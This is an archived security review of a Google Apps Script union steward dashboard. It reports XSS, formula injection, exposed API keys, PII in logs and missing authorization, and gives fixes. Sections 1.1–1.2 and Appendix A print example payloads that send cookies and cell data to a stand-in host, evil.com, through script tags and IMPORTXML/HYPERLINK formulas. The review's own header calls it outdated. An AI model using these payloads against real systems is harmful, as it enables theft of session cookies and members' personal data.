> **ARCHIVED** — This review is outdated and superseded by [`CODE_REVIEW.md`](../../CODE_REVIEW.md) (v4.9.0, 2026-02-21). Many critical issues identified here were later marked as "fixed" in other review docs but were still present. Do not rely on this document for current security posture.

# Security Review Report

> **Note:** This security review was conducted at v4.5.0.

**Repository:** Union Steward Dashboard (v4.5.0)
**Review Date:** February 2026
**Reviewer:** Claude Code Security Review
**Branch:** claude/security-review-qpHab

---

## Executive Summary

This comprehensive security review analyzed 15 Google Apps Script modules totaling ~47,000 lines of code. The application manages sensitive union member data including PII (names, emails, phones, addresses) and confidential grievance information.

### Security Health Score: 5/10

| Category | Score | Status |
|----------|-------|--------|
| XSS Prevention | 4/10 | Critical - Multiple unpatched vulnerabilities |
| Access Control | 7/10 | Good - Implemented but with gaps |
| Input Validation | 5/10 | Moderate - Inconsistent application |
| Formula Injection | 4/10 | Critical - Missing escaping in key areas |
| Data Protection | 6/10 | Moderate - PII exposure in logs |
| API Security | 5/10 | Moderate - Key exposure risks |
| Authentication | 7/10 | Good - Uses Google OAuth |

---

## Table of Contents

1. [Critical Vulnerabilities](#1-critical-vulnerabilities)
2. [High Severity Issues](#2-high-severity-issues)
3. [Medium Severity Issues](#3-medium-severity-issues)
4. [Low Severity Issues](#4-low-severity-issues)
5. [Positive Security Findings](#5-positive-security-findings)
6. [Remediation Recommendations](#6-remediation-recommendations)
7. [Security Architecture Analysis](#7-security-architecture-analysis)

---

## 1. Critical Vulnerabilities

### 1.1 Cross-Site Scripting (XSS) in Client-Side Rendering

**Severity: CRITICAL**
**CVSS Score: 8.1 (High)**
**CWE: CWE-79 (Improper Neutralization of Input During Web Page Generation)**

**Description:**
Multiple locations inject user-controlled data directly into innerHTML without sanitization, allowing arbitrary JavaScript execution.

**Affected Locations:**

| File | Lines | Vulnerable Data |
|------|-------|-----------------|
| `09_Dashboards.gs` | 316-331 | `r.worksite`, `r.role`, `r.shift`, `r.date`, `r.timeInRole` |
| `04a_UIMenus.gs / 04b-04e (UI modules)` | 2453-2461 | `m.name`, `m.id`, `m.title`, `m.location`, `m.email`, `m.phone`, `m.supervisor`, `m.assignedSteward`, `m.officeDays` |
| `04a_UIMenus.gs / 04b-04e (UI modules)` | 2500-2501 | Location and unit names in dropdown options |
| `05_Integrations.gs` | 1499-1501 | Member and grievance fields in HTML |

**Vulnerable Code Example (09_Dashboards.gs:316-331):**
```javascript
// VULNERABLE - User data directly concatenated
'  c.innerHTML=data.slice(0,50).map(function(r,i){' +
'    return"<div class=\\"list-item\\">' +
'      <div class=\\"list-item-title\\">"+r.worksite+" - "+r.role+"</div>' +
'      <div class=\\"list-item-subtitle\\">"+r.shift+" • "+r.timeInRole+" • "+r.date+"</div>' +
```

**Attack Vector:**
If an attacker can control a member's worksite, role, or other fields (through data import, direct sheet access, or form manipulation), they can inject:
```javascript
<img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie">
```

**Impact:**
- Session hijacking via cookie theft
- Data exfiltration of PII from rendered page
- Phishing attacks through UI manipulation
- Privilege escalation if admin views poisoned data

---

### 1.2 Formula Injection in Dynamic QUERY Construction

**Severity: CRITICAL**
**CVSS Score: 7.5 (High)**
**CWE: CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)**

**Description:**
Sheet names and user-controllable values are directly interpolated into Google Sheets formulas without using the available `safeSheetNameForFormula()` function.

**Affected Locations:**

| File | Lines | Issue |
|------|-------|-------|
| `12_Features.gs` | 1647 | `EXTENSION_CONFIG.MEMBER_SHEET` in QUERY formula |
| `08a_SheetSetup.gs / 08b-08d (Sheet utility modules)` | 3377, 3382-3405 | `SHEETS.*` constants in FILTER/COUNTIFS formulas |
| `08a_SheetSetup.gs / 08b-08d (Sheet utility modules)` | 3720-3728 | Dynamic VLOOKUP formulas |

**Vulnerable Code Example (12_Features.gs:1647):**
```javascript
// VULNERABLE - Sheet name not escaped
`=QUERY('${EXTENSION_CONFIG.MEMBER_SHEET}'!A:ZZ, "SELECT Col${isStewardCol}...`
```

**Attack Vector:**
If `EXTENSION_CONFIG.MEMBER_SHEET` is set to:
```
Member Directory'!A1); =HYPERLINK("https://evil.com/"&A1,"Click")//
```
This could execute arbitrary formulas or exfiltrate data.

**Impact:**
- Data exfiltration through IMPORTRANGE or HYPERLINK
- Formula-based phishing
- Denial of service through recursive formulas

---

### 1.3 API Key Exposure in URL Query String

**Severity: CRITICAL**
**CVSS Score: 7.2 (High)**
**CWE: CWE-598 (Use of GET Request Method With Sensitive Query Strings)**

**Description:**
The Cloud Vision API key is passed in the URL query string, making it vulnerable to logging, browser history, and referrer header leakage.

**Location:** `src/11_CommandHub.gs:1676-1677`

```javascript
var response = UrlFetchApp.fetch(
  'https://vision.googleapis.com/v1/images:annotate?key=' + apiKey,  // VULNERABLE
```

**Impact:**
- API key visible in server logs, browser history, referrer headers
- Unauthorized API usage if key is leaked
- Financial impact from API quota abuse

---

## 2. High Severity Issues

### 2.1 PII Exposure in Application Logs

**Severity: HIGH**
**CWE: CWE-532 (Insertion of Sensitive Information into Log File)**

**Description:**
Email addresses, member IDs, and other PII are logged despite the availability of `secureLog()` and `mask*()` functions.

**Affected Locations:**

| File | Line | PII Exposed |
|------|------|-------------|
| `05_Integrations.gs` | 897 | `'Grievance PDF emailed to: ' + data.memberEmail` |
| `08a_SheetSetup.gs / 08b-08d (Sheet utility modules)` | 1759 | Member name, match type |
| `08a_SheetSetup.gs / 08b-08d (Sheet utility modules)` | 1764, 1796 | `firstName + ' ' + lastName` |
| `08a_SheetSetup.gs / 08b-08d (Sheet utility modules)` | 2669, 2671 | Steward name and email |
| `10_Main.gs` | 226-227 | User email in sabotage alert |

**Remediation:** Replace `Logger.log()` with `secureLog()` for all PII-containing messages.

---

### 2.2 Overly Permissive OAuth Scopes

**Severity: HIGH**
**CWE: CWE-250 (Execution with Unnecessary Privileges)**

**Location:** `appsscript.json:6-10`

```json
"oauthScopes": [
  "https://www.googleapis.com/auth/spreadsheets.currentonly",
  "https://www.googleapis.com/auth/spreadsheets",  // REDUNDANT/OVERLY BROAD
  "https://www.googleapis.com/auth/script.container.ui"
]
```

**Issue:**
Both `spreadsheets.currentonly` and `spreadsheets` scopes are declared. The broader `spreadsheets` scope grants access to ALL user spreadsheets, not just the current one.

**Missing Scopes for Declared Features:**
- `https://www.googleapis.com/auth/drive` - For Drive integration
- `https://www.googleapis.com/auth/calendar` - For Calendar sync
- `https://www.googleapis.com/auth/gmail.send` - For email notifications

---

### 2.3 Missing Authorization on Legacy Pages

**Severity: HIGH**
**CWE: CWE-862 (Missing Authorization)**

**Location:** `src/05_Integrations.gs:1169-1197`

**Description:**
While `mode=steward` correctly requires authorization, the legacy page routes (`search`, `grievances`, `members`) do not have explicit authorization checks and may expose PII.

```javascript
// Step 4: Standard page routing for mobile dashboard (legacy support)
var page = validation.params.page || (e && e.parameter && e.parameter.page) || 'dashboard';

switch (page) {
  case 'members':
    html = getWebAppMemberListHtml();  // NO AUTH CHECK - Contains PII
    break;
```

---

## 3. Medium Severity Issues

### 3.1 Clickjacking Vulnerability (X-Frame-Options)

**Severity: MEDIUM**
**CWE: CWE-1021 (Improper Restriction of Rendered UI Layers)**

**Location:** `src/05_Integrations.gs:1146, 1201`

```javascript
.setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL)
```

**Issue:** The web app can be embedded in iframes from any origin, enabling clickjacking attacks.

**Recommendation:** Use `XFrameOptionsMode.DEFAULT` or `XFrameOptionsMode.DENY` unless cross-origin embedding is required.

---

### 3.2 Inconsistent Input Validation

**Severity: MEDIUM**
**CWE: CWE-20 (Improper Input Validation)**

**Description:**
While `00_Security.gs` provides validation functions (`isValidMemberId`, `isValidSafeString`), they are not consistently applied throughout the codebase.

**Examples of Missing Validation:**
- `showNewMemberDialog()` - Form data not validated before processing
- `updateMember()` - Member data not validated
- Various `google.script.run` callbacks - Client-submitted data trusted implicitly

---

### 3.3 Sensitive Error Messages

**Severity: MEDIUM**
**CWE: CWE-209 (Generation of Error Message Containing Sensitive Information)**

**Description:**
Some error handlers expose internal details that could aid attackers.

**Example (11_CommandHub.gs:1720-1722):**
```javascript
return {
  success: false,
  message: 'Cloud Vision API call failed: ' + e.message  // May expose internal paths/state
};
```

---

## 4. Low Severity Issues

### 4.1 Missing Content Security Policy

**Severity: LOW**
**CWE: CWE-1021**

HTML output does not set a Content Security Policy header, allowing inline scripts and potentially unsafe content loading.

### 4.2 Hardcoded Configuration Values

**Severity: LOW**

Various configuration values are hardcoded rather than stored in Script Properties:
- Deadline day counts
- Color codes
- Sheet names

### 4.3 No Rate Limiting on Sensitive Operations

**Severity: LOW**
**CWE: CWE-770 (Allocation of Resources Without Limits)**

No rate limiting on:
- Member/grievance creation
- Email sending
- OCR requests

---

## 5. Positive Security Findings

### 5.1 Security Module (00_Security.gs)

The codebase includes a comprehensive security module with:

| Function | Purpose | Status |
|----------|---------|--------|
| `escapeHtml()` | XSS prevention | Available but underutilized |
| `sanitizeForHtml()` | HTML sanitization | Available but underutilized |
| `sanitizeObjectForHtml()` | Object sanitization | Available but underutilized |
| `escapeForFormula()` | Formula injection prevention | Available |
| `safeSheetNameForFormula()` | Safe sheet references | Available but underutilized |
| `buildSafeQuery()` | Safe QUERY construction | Available but underutilized |
| `checkWebAppAuthorization()` | Access control | Implemented for steward mode |
| `validateWebAppRequest()` | Parameter validation | Implemented |
| `isValidMemberId()` | ID format validation | Available |
| `isValidSafeString()` | String validation | Available |
| `maskEmail()`, `maskPhone()`, `maskName()` | PII masking | Available but underutilized |
| `secureLog()` | Safe logging | Available but underutilized |
| `getClientSecurityScript()` | Client-side escaping | Available |

### 5.2 Access Control Implementation

- Role-based access control with admin/steward/member/anonymous roles
- Authorization required for steward dashboard (PII access)
- Parameter validation on web app entry points
- Access denied page with secure error handling

### 5.3 Credential Management

- API keys stored in Script Properties (not hardcoded)
- `.gitignore` excludes `.clasprc.json` and `.env` files
- No credentials found in source code

### 5.4 Secure Patterns Available

- Data Access Layer abstraction (`00_DataAccess.gs`)
- Centralized error handling
- Audit logging infrastructure

---

## 6. Remediation Recommendations

### 6.1 Immediate Actions (P0 - Within 1 Week)

#### Fix XSS Vulnerabilities
Replace all direct innerHTML concatenation with sanitized versions:

```javascript
// BEFORE (Vulnerable)
'return"<div class=\\"list-item-title\\">"+r.worksite+" - "+r.role+"</div>';

// AFTER (Safe) - Use escapeHtml from client-side security script
'return"<div class=\\"list-item-title\\">"+escapeHtml(r.worksite)+" - "+escapeHtml(r.role)+"</div>";
```

**Files to update:**
- `09_Dashboards.gs` - Lines 316-331
- `04a_UIMenus.gs / 04b-04e (UI modules)` - Lines 2453-2461, 2500-2501
- All functions generating HTML with user data

#### Fix Formula Injection
Use `safeSheetNameForFormula()` for all sheet references:

```javascript
// BEFORE (Vulnerable)
`=QUERY('${EXTENSION_CONFIG.MEMBER_SHEET}'!A:ZZ, ...`

// AFTER (Safe)
const safeSheet = safeSheetNameForFormula(EXTENSION_CONFIG.MEMBER_SHEET);
`=QUERY(${safeSheet}!A:ZZ, ...`
```

#### Move API Key to Request Body
```javascript
// BEFORE (Key in URL)
UrlFetchApp.fetch('https://vision.googleapis.com/v1/images:annotate?key=' + apiKey, ...

// AFTER (Key in Header - preferred by Google)
UrlFetchApp.fetch('https://vision.googleapis.com/v1/images:annotate', {
  headers: { 'X-Goog-Api-Key': apiKey },
  ...
});
```

### 6.2 Short-term Actions (P1 - Within 2 Weeks)

1. **Add authorization to all page routes** - Implement auth checks for `members`, `grievances`, `search` pages

2. **Replace all Logger.log with secureLog** - Audit and replace PII-containing log statements

3. **Remove redundant OAuth scope** - Keep only `spreadsheets.currentonly`

4. **Set XFrameOptions to DENY** - Unless embedding is explicitly required

### 6.3 Medium-term Actions (P2 - Within 1 Month)

1. **Implement CSP headers** via HtmlService
2. **Add rate limiting** for sensitive operations
3. **Create input validation middleware** for all form handlers
4. **Security unit tests** for XSS and injection functions

---

## 7. Security Architecture Analysis

### 7.1 Data Flow Security

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│   Web App       │────>│   doGet()        │────>│  Authorization  │
│   (Browser)     │     │   Entry Point    │     │  Check          │
└─────────────────┘     └──────────────────┘     └─────────────────┘
        │                       │                        │
        │                       v                        │
        │               ┌──────────────────┐            │
        │               │ Parameter        │            │
        │               │ Validation       │<───────────┘
        │               └──────────────────┘
        │                       │
        v                       v
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│   HTML Output   │<────│   Data Access    │<────│  Google Sheets  │
│   (XSS Risk)    │     │   Layer          │     │  (Data Store)   │
└─────────────────┘     └──────────────────┘     └─────────────────┘
```

### 7.2 Trust Boundaries

| Boundary | Trust Level | Threats |
|----------|-------------|---------|
| User Browser <-> Web App | Untrusted | XSS, CSRF |
| Web App <-> Google APIs | Trusted | Credential exposure |
| Google Sheets <-> Formulas | Semi-trusted | Formula injection |
| Script Properties <-> Code | Trusted | Config tampering |

### 7.3 Security Controls Summary

| Control | Implemented | Effectiveness |
|---------|-------------|---------------|
| Authentication | Yes (Google OAuth) | Strong |
| Authorization | Partial | Moderate |
| Input Validation | Partial | Weak |
| Output Encoding | Available, underused | Weak |
| Logging | Yes, with PII issues | Moderate |
| Error Handling | Yes | Moderate |

---

## Appendix A: Vulnerability Details

### A.1 XSS Payload Examples

**Stored XSS via Member Name:**
```
John<script>fetch('https://evil.com/'+document.cookie)</script>
```

**Attribute Injection:**
```
" onclick="alert(1)" data-x="
```

### A.2 Formula Injection Payloads

**Data Exfiltration:**
```
=IMPORTXML("https://evil.com/log?data="&A1,"//p")
```

**Phishing:**
```
=HYPERLINK("https://evil.com/phish","Click to verify")
```

---

## Appendix B: Security Testing Checklist

- [ ] XSS testing on all user-input fields
- [ ] Formula injection testing on import/export
- [ ] Authorization bypass testing on all endpoints
- [ ] Session management testing
- [ ] API key rotation verification
- [ ] Log review for PII exposure
- [ ] OAuth scope verification

---

*Report generated by Claude Code Security Review*
*Last updated: February 2026*
